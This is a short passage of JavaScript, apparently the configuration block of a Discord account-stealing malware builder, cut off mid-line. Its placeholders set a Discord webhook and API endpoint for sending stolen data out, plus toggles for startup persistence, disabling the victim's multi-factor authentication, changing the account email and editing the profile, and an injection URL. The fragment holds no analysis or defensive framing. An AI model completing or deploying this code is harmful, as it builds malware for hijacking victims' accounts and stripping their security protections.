...
const CONFIG = {
  webhook: "%WEBHOOK_URL%", // 'https://discord.com/api/webhooks/...'
  API: "%API_URL%", // 'https://your-api-url.com'
  auto_user_profile_edit: "%AUTO_PROFILE%", // 'true' o 'false'
  auto_persist_startup: "%AUTO_PERSIST_STARTUP%", //  'true' o 'false'
  auto_mfa_disabler: "%AUTO_MFA_DISABLER%", // 'true' o 'false'
  auto_email_update: "%AUTO_EMAIL_UPDATE%", // 'true' o 'false'
  injection_url:
